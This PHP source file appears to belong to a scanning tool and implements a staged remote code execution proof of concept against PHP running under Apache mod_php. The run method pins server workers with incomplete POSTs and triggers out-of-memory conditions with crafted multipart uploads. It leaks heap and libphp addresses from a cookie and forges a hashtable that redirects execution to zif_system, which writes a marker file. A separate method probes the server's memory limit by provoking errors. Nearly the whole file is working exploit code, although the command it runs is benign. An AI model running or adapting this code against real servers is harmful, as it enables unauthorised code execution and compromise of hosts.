<?php

declare(strict_types=1);

namespace Php2ShellTui\Poc;

use Php2ShellTui\Http\Client;
use Php2ShellTui\ScanCancelled;
use Php2ShellTui\ScanRestart;
use Php2ShellTui\Target;
use Psr\Http\Message\ResponseInterface;

final class Php2ShellPoc
{
    private const PRELUDE_TYPE = 'multipart/form-data; boundary=SSSSSSSSSSSSSSSSS';
    private const STAGE_TYPE = 'multipart/form-data; boundary=BBBBBBBBBB';
    private const ROTATE_TYPE = 'multipart/form-data; boundary=BNDRY12345';
    private const PROOF_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

    public function __construct(
        private readonly ?PayloadBuilder $builder = null,
        private readonly ?Client $client = null,
    ) {
    }

    public function run(Target $target, Profile $profile, PocPlan $plan, ?\Closure $onTick = null): PocResult
    {
        if (!$profile->rceVerified()) {
            return new PocResult(false, 'profile is not verified for RCE');
        }

        if (strtolower($profile->sapi()) !== 'apache2handler') {
            return new PocResult(false, 'the verified chain is mod_php only');
        }

        if ($plan->workers === null) {
            return new PocResult(false, 'workers are not configured');
        }

        if ($plan->memoryLimitMb === null) {
            return new PocResult(false, 'memory limit is not resolved');
        }

        if ($plan->workers < 1 || $plan->workers > $plan->maxWorkers) {
            return new PocResult(false, 'worker cap exceeded');
        }

        if ($this->client === null) {
            return new PocResult(false, 'proof client is not configured');
        }

        $parts = parse_url($target->url);
        $scheme = strtolower((string) ($parts['scheme'] ?? ''));
        $host = (string) ($parts['host'] ?? '');

        if (!in_array($scheme, ['http', 'https'], true) || $host === '') {
            return new PocResult(false, 'target URL is not a supported HTTP URL');
        }

        $port = (int) ($parts['port'] ?? ($scheme === 'https' ? 443 : 80));
        $path = $target->postPath ?? (string) ($parts['path'] ?? '/');
        $path = $path !== '' ? $path : '/';

        if ($path[0] !== '/') {
            return new PocResult(false, 'post path must start with "/"');
        }

        if ($plan->workers > 1 && function_exists('posix_getrlimit')) {
            $limits = posix_getrlimit();
            $soft = $limits['openfiles_soft'] ?? null;
            if (is_numeric($soft) && (int) $soft > 0 && $plan->workers + 20 > (int) $soft) {
                return new PocResult(false, sprintf('local file-descriptor budget is too small for %d holders', $plan->workers - 1));
            }
        }

        $origin = self::origin($scheme, $host, $port);
        $proof = $this->chooseProofPath($target, $origin, $path, $onTick);

        if (is_string($proof)) {
            return new PocResult(false, $proof);
        }

        [$proofFile, $proofCandidates] = $proof;
        $marker = $this->marker();
        $command = 'echo ' . $marker . '>' . $proofFile;

        if (strlen($command) !== 14) {
            return new PocResult(false, 'proof command does not fit the carrier');
        }

        $hugeMb = $plan->memoryLimitMb === 8 && $profile->oomMb() > 0
            ? $profile->oomMb()
            : $plan->memoryLimitMb + $profile->oomMarginMb();

        $builder = $this->builder ?? new PayloadBuilder();
        $raw = new RawHttp($scheme, $host, $port, $plan->requestTimeout, $target->requestHeaders());
        $deadline = microtime(true) + $plan->timeout;
        $temporary = [];
        $chunk = 0;
        $libphp = 0;

        try {
            $this->tick($onTick);

            if ($plan->workers > 1) {
                $holders = 0;
                for ($i = 0; $i < $plan->workers - 1; $i++) {
                    try {
                        $raw->openIncompletePost($path, 1048576);
                        $holders++;
                        $this->wait(10_000, $onTick);
                    } catch (\Throwable) {
                        break;
                    }
                }

                if ($holders < $plan->workers - 1) {
                    return new PocResult(false, sprintf('worker pinning failed (%d/%d holders)', $holders, $plan->workers - 1));
                }

                $this->wait(800_000, $onTick);
            }

            $this->rotate($raw, $builder, $path, $hugeMb, $deadline, $onTick, $temporary);

            for ($attempt = 0; $attempt < $plan->retries; $attempt++) {
                if (microtime(true) > $deadline) {
                    return new PocResult(false, 'overall timeout before stage 1');
                }

                $a = $this->temp($temporary);
                $b = $this->temp($temporary);
                $chunk = 0;

                try {
                    $builder->stage1A($a, $hugeMb);
                    $this->tick($onTick);
                    $raw->sendNow($path, $a, self::PRELUDE_TYPE, $this->remaining($deadline));
                    $this->wait(200_000, $onTick);

                    $builder->stage1B($b, $profile->stage1N(), $profile->stage1ForgeLen());
                    $this->tick($onTick);
                    $response = $raw->sendBody($path, $b, self::STAGE_TYPE, 9 << 20, $this->remaining($deadline));

                    try {
                        $chunk = CookieLeakParser::chunkBase(CookieLeakParser::cookie($response));
                    } catch (\Throwable) {
                        $chunk = 0;
                    }
                } catch (ScanCancelled|ScanRestart $e) {
                    throw $e;
                } catch (\Throwable) {
                    $chunk = 0;
                }

                $this->delete($a, $b);

                if ($chunk > 0) {
                    break;
                }

                $this->rotate($raw, $builder, $path, $hugeMb, $deadline, $onTick, $temporary);
            }

            if ($chunk <= 0) {
                return new PocResult(false, 'stage 1 heap leak failed');
            }

            $this->rotate($raw, $builder, $path, $hugeMb, $deadline, $onTick, $temporary);

            for ($attempt = 0; $attempt < $plan->retries; $attempt++) {
                if (microtime(true) > $deadline) {
                    return new PocResult(false, 'overall timeout before stage 2');
                }

                $a = $this->temp($temporary);
                $b = $this->temp($temporary);
                $libphp = 0;

                try {
                    $builder->stage2A($a, $hugeMb);
                    $this->tick($onTick);
                    $raw->sendNow($path, $a, self::PRELUDE_TYPE, $this->remaining($deadline));
                    $this->wait(200_000, $onTick);

                    $builder->stage2B($b, $profile->stage2T(), $profile->stage2V());
                    $this->tick($onTick);
                    $response = $raw->sendBody($path, $b, self::STAGE_TYPE, 1 << 20, $this->remaining($deadline));

                    try {
                        $libphp = CookieLeakParser::libphpBase(
                            CookieLeakParser::cookie($response),
                            $profile->libphp()['zval_ptr_dtor'],
                        );
                    } catch (\Throwable) {
                        $libphp = 0;
                    }
                } catch (ScanCancelled|ScanRestart $e) {
                    throw $e;
                } catch (\Throwable) {
                    $libphp = 0;
                }

                $this->delete($a, $b);

                if ($libphp > 0) {
                    break;
                }

                $this->rotate($raw, $builder, $path, $hugeMb, $deadline, $onTick, $temporary);
            }

            if ($libphp <= 0) {
                return new PocResult(false, 'stage 2 libphp leak failed');
            }

            $this->rotate($raw, $builder, $path, $hugeMb, $deadline, $onTick, $temporary);

            $htdata = $chunk + $profile->libphp()['htdata'];
            $zif = $libphp + $profile->libphp()['zif_system'];
            $payload = $builder->fakePayload($htdata, $zif, $command);
            $evidence = [
                'profile' => $profile->id(),
                'chunk' => sprintf('0x%x', $chunk),
                'libphp' => sprintf('0x%x', $libphp),
                'zif_system' => sprintf('0x%x', $zif),
                'htdata' => sprintf('0x%x', $htdata),
                'marker' => $marker,
            ];

            for ($attempt = 0; $attempt < $plan->retries + 2; $attempt++) {
                if (microtime(true) > $deadline) {
                    return new PocResult(false, 'overall timeout before the proof', null, json_encode($evidence, JSON_THROW_ON_ERROR));
                }

                $a = $this->temp($temporary);
                $b = $this->temp($temporary);

                try {
                    $builder->stage3A($a, $profile->stage3Pads(), $hugeMb);
                    $cookie = $profile->upstreamProfile() === 'bookworm'
                        ? ['Cookie' => 'PHPSESSID=' . str_repeat('a', 32)]
                        : [];
                    $this->tick($onTick);
                    $raw->sendNow($path, $a, self::PRELUDE_TYPE, $this->remaining($deadline), $cookie);
                    $this->wait(300_000, $onTick);

                    $ref = $profile->stage3Carrier() ? null : $payload['ref'];
                    $carrier = $profile->stage3Carrier() ? $payload['carrier'] : null;
                    $builder->stage3B($b, $payload['ht'], $ref, $carrier);
                    $this->tick($onTick);
                    $raw->sendBody($path, $b, self::STAGE_TYPE, 65536, min(30.0, $this->remaining($deadline)));
                } catch (ScanCancelled|ScanRestart $e) {
                    throw $e;
                } catch (\Throwable) {
                    // Retry the stage; the worker may have aborted mid-upload.
                }

                $this->delete($a, $b);
                $this->wait(800_000, $onTick);

                foreach ($proofCandidates as $candidate) {
                    $proofUrl = $origin . $candidate . '?p2s=' . bin2hex(random_bytes(4));
                    $response = $this->client->get($proofUrl, $target->requestHeaders());

                    if ($response === null || !self::proofMatches($response, $marker)) {
                        continue;
                    }

                    $evidence['proof_url'] = $proofUrl;

                    return new PocResult(
                        confirmed: true,
                        reason: 'RCE confirmed on the target',
                        proof: $marker,
                        evidence: json_encode($evidence, JSON_THROW_ON_ERROR),
                        proofPath: $proofUrl,
                    );
                }

                $this->rotate($raw, $builder, $path, $hugeMb, $deadline, $onTick, $temporary);
            }

            return new PocResult(false, 'proof not retrievable from the candidate paths', null, json_encode($evidence, JSON_THROW_ON_ERROR));
        } catch (ScanCancelled|ScanRestart $e) {
            throw $e;
        } catch (\Throwable $e) {
            return new PocResult(false, 'PoC failed: ' . $e->getMessage());
        } finally {
            $raw->close();
            foreach ($temporary as $file) {
                @unlink($file);
            }
        }
    }

    public function probeMemoryLimit(Target $target, float $requestTimeout): ?int
    {
        $parts = parse_url($target->url);
        $scheme = strtolower((string) ($parts['scheme'] ?? ''));
        $host = (string) ($parts['host'] ?? '');

        if (!in_array($scheme, ['http', 'https'], true) || $host === '') {
            return null;
        }

        $port = (int) ($parts['port'] ?? ($scheme === 'https' ? 443 : 80));
        $path = $target->postPath ?? (string) ($parts['path'] ?? '/');
        $path = $path !== '' ? $path : '/';
        $raw = new RawHttp($scheme, $host, $port, $requestTimeout, $target->requestHeaders());

        try {
            foreach ([16, 64, 128, 256] as $mb) {
                $file = tempnam(sys_get_temp_dir(), 'p2s-probe-');
                if ($file === false) {
                    continue;
                }

                $fh = fopen($file, 'wb');
                if ($fh === false) {
                    @unlink($file);
                    continue;
                }

                fwrite($fh, 'big=');
                $remaining = $mb * 1024 * 1024;
                while ($remaining > 0) {
                    $chunk = min($remaining, 1048576);
                    fwrite($fh, str_repeat('A', $chunk));
                    $remaining -= $chunk;
                }
                fclose($fh);

                try {
                    $response = $raw->sendBody($path, $file, 'application/x-www-form-urlencoded', 65536, $requestTimeout);
                } finally {
                    @unlink($file);
                }

                if (preg_match('/Allowed memory size of (\d+) bytes/i', $response, $matches) === 1) {
                    return max(1, intdiv((int) $matches[1], 1048576));
                }
            }
        } catch (\Throwable) {
            return null;
        } finally {
            $raw->close();
        }

        return null;
    }

    public static function proofMatches(ResponseInterface $response, string $marker): bool
    {
        return $response->getStatusCode() === 200
            && trim((string) $response->getBody()) === $marker;
    }

    /**
     * @return array{string, list<string>}|string
     */
    private function chooseProofPath(Target $target, string $origin, string $path, ?\Closure $onTick): array|string
    {
        for ($attempt = 0; $attempt < 5; $attempt++) {
            $file = ProofPath::randomFile();
            $candidates = ProofPath::candidates($path, $file);
            $free = true;

            foreach ($candidates as $candidate) {
                $this->tick($onTick);
                $url = $origin . $candidate . '?p2s=' . bin2hex(random_bytes(4));
                $response = $this->client?->get($url, $target->requestHeaders());

                if ($response === null || $response->getStatusCode() !== 404) {
                    $free = false;
                    break;
                }
            }

            if ($free) {
                return [$file, $candidates];
            }
        }

        return 'proof paths are not free';
    }

    /**
     * @param list<string> $temporary
     */
    private function rotate(
        RawHttp $raw,
        PayloadBuilder $builder,
        string $path,
        int $hugeMb,
        float $deadline,
        ?\Closure $onTick,
        array &$temporary,
    ): void {
        if (microtime(true) > $deadline) {
            return;
        }

        $a = $this->temp($temporary);
        $b = $this->temp($temporary);

        try {
            $builder->rotateA($a, $hugeMb);
            $this->tick($onTick);
            $raw->sendNow($path, $a, self::PRELUDE_TYPE, $this->remaining($deadline));
            $this->wait(300_000, $onTick);

            $builder->rotateB($b);
            $this->tick($onTick);
            $raw->sendNow($path, $b, self::ROTATE_TYPE, $this->remaining($deadline));
            $this->wait(500_000, $onTick);
        } catch (ScanCancelled|ScanRestart $e) {
            throw $e;
        } catch (\Throwable) {
            // Best effort: the next stage will surface a hard failure.
        } finally {
            $this->delete($a, $b);
        }
    }

    /**
     * @param list<string> $temporary
     */
    private function temp(array &$temporary): string
    {
        $path = tempnam(sys_get_temp_dir(), 'p2s-');
        if ($path === false) {
            throw new \RuntimeException('Cannot create a payload file.');
        }

        $temporary[] = $path;

        return $path;
    }

    private function delete(string ...$paths): void
    {
        foreach ($paths as $path) {
            @unlink($path);
        }
    }

    private function remaining(float $deadline): float
    {
        return max(1.0, $deadline - microtime(true));
    }

    private function marker(): string
    {
        $marker = '';
        $max = strlen(self::PROOF_CHARS) - 1;

        for ($i = 0; $i < 7; $i++) {
            $marker .= self::PROOF_CHARS[random_int(0, $max)];
        }

        return $marker;
    }

    private function tick(?\Closure $onTick): void
    {
        if ($onTick !== null) {
            $onTick();
        }
    }

    private function wait(int $microseconds, ?\Closure $onTick): void
    {
        while ($microseconds > 0) {
            $this->tick($onTick);
            $slice = min($microseconds, 50_000);
            usleep($slice);
            $microseconds -= $slice;
        }
    }

    private static function origin(string $scheme, string $host, int $port): string
    {
        if (str_contains($host, ':') && !str_starts_with($host, '[')) {
            $host = '[' . $host . ']';
        }

        return sprintf('%s://%s:%d', $scheme, $host, $port);
    }
}
